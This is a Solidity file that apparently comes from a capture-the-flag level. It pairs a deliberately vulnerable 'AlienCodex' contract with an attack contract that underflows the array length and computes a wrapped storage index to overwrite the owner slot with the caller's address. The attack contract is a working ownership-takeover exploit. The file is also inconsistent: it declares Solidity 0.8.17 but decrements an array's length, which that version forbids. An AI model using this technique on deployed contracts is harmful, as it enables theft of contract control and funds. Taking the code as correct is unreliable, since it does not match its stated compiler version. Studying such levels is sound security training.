// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;


import '../helpers/Ownable-05.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}

//////////////////////////////////////////////
///////////////ATTACK/////////////////////////
//////////////////////////////////////////////

contract Arttack{ 
    constructor(AlienCodex target){
// passing the modifier
    target.make_contact();
// using the underflow vulnerability to set the array length to 2 ** 256 -1
    target.retract();

// h is th slot for first element in array
    uint h = uint256(keccak256(abi.encode(1)));


// i would be the owner slot 
uint i;
    unchecked{   i -= h;}
    target.revise(i, bytes32(uint256(uint160(msg.sender))));
    
    }
} 
